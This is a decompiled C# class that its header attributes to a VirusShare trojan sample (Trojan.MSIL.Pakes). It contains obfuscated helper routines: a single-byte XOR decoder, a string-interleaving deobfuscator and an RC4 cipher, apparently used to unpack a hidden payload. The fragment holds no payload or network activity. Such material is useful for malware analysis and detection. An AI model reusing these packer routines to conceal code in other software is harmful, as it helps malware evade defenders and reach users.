// Decompiled with JetBrains decompiler
// Type: Isu3zna5bkhldsr5odxeh1vqs1xpxoutm
// Assembly: k5xkdoui, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CD3E51E-5608-4BA4-B66B-04206D6A26CE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Pakes.cs-37cd70e587eb1be5e97c2131880d030c32b02d02e1db6caf24f5eca693e9b335.exe

using System;
using System.Text;

public static class Isu3zna5bkhldsr5odxeh1vqs1xpxoutm
{
  public static int Jzteuvzbigynns5y0qarufxpy = 129;

  public static byte[] p1pgnq0wwiojtmg4ffwhjwkav(byte[] Xwvoaviz40w1dt5zq15s2qdcu)
  {
    for (int index = 0; index < Xwvoaviz40w1dt5zq15s2qdcu.Length; ++index)
    {
      char ch = (char) ((uint) Convert.ToChar(Xwvoaviz40w1dt5zq15s2qdcu[index]) ^ (uint) Isu3zna5bkhldsr5odxeh1vqs1xpxoutm.Jzteuvzbigynns5y0qarufxpy);
      Xwvoaviz40w1dt5zq15s2qdcu[index] = Convert.ToByte(ch);
    }
    return Xwvoaviz40w1dt5zq15s2qdcu;
  }

  public static string k32g0xj5z4a4rs15j(string fagydxc2hdvxrnukr)
  {
    int length = fagydxc2hdvxrnukr.Length;
    string str1 = fagydxc2hdvxrnukr.Substring(0, (fagydxc2hdvxrnukr.Length + 1) / 2);
    string str2 = fagydxc2hdvxrnukr.Substring((fagydxc2hdvxrnukr.Length + 1) / 2, fagydxc2hdvxrnukr.Length - (fagydxc2hdvxrnukr.Length + 1) / 2);
    int num = 0;
    StringBuilder stringBuilder = new StringBuilder(str1);
    for (int index = 0; index < str2.Length; ++index)
    {
      stringBuilder.Insert(num + 1, str2[index]);
      num += 2;
    }
    return stringBuilder.ToString();
  }

  public static void RC4(ref byte[] bytes, byte[] key)
  {
    byte[] numArray1 = new byte[256];
    byte[] numArray2 = new byte[256];
    for (int index = 0; index < 256; ++index)
    {
      numArray1[index] = (byte) index;
      numArray2[index] = key[index % key.GetLength(0)];
    }
    int index1 = 0;
    for (int index2 = 0; index2 < 256; ++index2)
    {
      index1 = (index1 + (int) numArray1[index2] + (int) numArray2[index2]) % 256;
      byte num = numArray1[index2];
      numArray1[index2] = numArray1[index1];
      numArray1[index1] = num;
    }
    int index3;
    int index4 = index3 = 0;
    for (int index5 = 0; index5 < bytes.GetLength(0); ++index5)
    {
      index4 = (index4 + 1) % 256;
      index3 = (index3 + (int) numArray1[index4]) % 256;
      byte num = numArray1[index4];
      numArray1[index4] = numArray1[index3];
      numArray1[index3] = num;
      int index6 = ((int) numArray1[index4] + (int) numArray1[index3]) % 256;
      bytes[index5] ^= numArray1[index6];
    }
  }
}
